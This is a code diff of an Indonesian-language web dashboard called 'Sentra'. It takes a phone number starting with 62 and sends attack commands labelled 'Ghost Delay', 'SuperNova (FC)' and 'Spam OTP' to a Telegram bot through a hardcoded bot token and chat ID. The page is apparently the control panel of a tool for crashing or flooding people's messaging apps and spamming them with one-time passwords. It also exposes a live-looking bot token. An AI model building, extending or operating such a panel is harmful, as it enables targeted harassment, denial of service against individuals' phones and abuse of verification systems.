@@ -1,51 +1,43 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Dashboard - Sentra</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
   <div class="login-container">
     <h2 id="welcome">Selamat Datang!</h2>
-    <input type="text" id="target" placeholder="Masukkan target (cth: 628xxxx)">
-    <button onclick="sendCommand('delay')">Delay</button>
-    <button onclick="sendCommand('fc')">FC</button>
-    <button onclick="sendCommand('spam otp')">Spam OTP</button>
+    <input type="text" id="target" placeholder="Masukkan target (cth: 628xxxx)" />
+    <button onclick="sendCommand('/ghostdelay')">Ghost Delay</button>
+    <button onclick="sendCommand('/SuperNova')">SuperNova (FC)</button>
+    <button onclick="sendCommand('/spamotp')">Spam OTP</button>
     <button onclick="logout()" style="background:#ff4d4d;color:white">Logout</button>
   </div>
 
   <script>
-    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI"; // Ganti dengan token bot kamu
-    const chatId = "7390831887"; // Ganti dengan ID Telegram kamu (user ID / group ID)
+    const botToken = "7867246789:AAHkPwB0-khjfosZE9l3ORVcgfiYAVLn4DI"; // Bot A token
+    const chatId = "-1002745890175"; // ID grup/akun tujuan Bot A
 
     function logout() {
       localStorage.removeItem("sentra_user");
-      window.location.href = "index.html";
+      window.location.href = "login.html";
     }
 
-    function sendCommand(cmd) {
+    function sendCommand(command) {
       const target = document.getElementById("target").value.trim();
-      const user = localStorage.getItem("sentra_user") || "Unknown";
 
       if (!target.startsWith("62")) {
         alert("Target harus dimulai dengan 62");
         return;
       }
 
-      let commandText = "";
-
-      if (cmd === "delay") commandText = `/ghostdelay ${target}`;
-      else if (cmd === "fc") commandText = `/SuperNova ${target}`;
-      else if (cmd === "spam otp") commandText = `/otp ${target}`;
-
-      const message = `👤 Menu: ${cmd.toUpperCase()}\n📱 Target: ${target}\n👤 User: ${user}\n\n${commandText}`;
-
+      const text = `${command} ${target}`;
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
+        body: JSON.stringify({ chat_id: chatId, text })
       }).then(() => {
         alert("Terkirim!");
         document.getElementById("target").value = "";
@@ -57,7 +49,7 @@
 
     window.onload = () => {
       const user = localStorage.getItem("sentra_user");
-      if (!user) return window.location.href = "index.html";
+      if (!user) return window.location.href = "login.html";
       document.getElementById("welcome").innerText = `Selamat Datang, ${user}!`;
     }
   </script>
